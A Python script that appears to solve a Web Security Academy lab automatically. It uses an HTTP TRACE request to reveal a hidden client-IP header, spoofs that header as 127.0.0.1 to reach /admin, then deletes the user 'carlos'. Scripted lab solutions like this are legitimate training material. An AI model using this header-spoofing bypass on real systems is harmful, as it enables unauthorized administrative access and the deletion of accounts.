from web_security_academy.core.logger import logger
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    # Send TRACE request
    logger.info('Sending a TRACE request to "/admin"...')
    resp = session.request("TRACE", urljoin(session.url, "/admin"))
    if resp.status_code != 200:
        logger.failure("TRACE request came back with an unexpected response.")
        return
    else:
        logger.success("TRACE request came back with the following response:")
        print(resp.text, end="")

    # Extract custom HTTP header
    query = re.search(
        # Matches header line that contains an IP address
        r"([\S]+): [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",
        resp.text,
    )
    if query is None:
        logger.failure("Did not find expected HTTP header.")
        return
    else:
        hidden_header = query.group(1)

    # Deleting user "carlos"
    logger.info('Visiting "/admin" with the following header:')
    headers = {hidden_header: "127.0.0.1"}
    logger.info(f"{headers}")

    resp = session.get_path("/admin", headers=headers)
    if resp.status_code != 200:
        logger.failure('Unable to visit "/admin".')
        return

    logger.info("Using the response to find path to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        logger.failure("Unable to find URL.")
        return
    else:
        delete = tag.get("href")
        logger.success(f"Found URL: {delete}")

    logger.info(
        f'Deleting the user carlos by visiting "{delete}" (with custom header)...'
    )
    resp = session.get_path(delete, headers=headers)
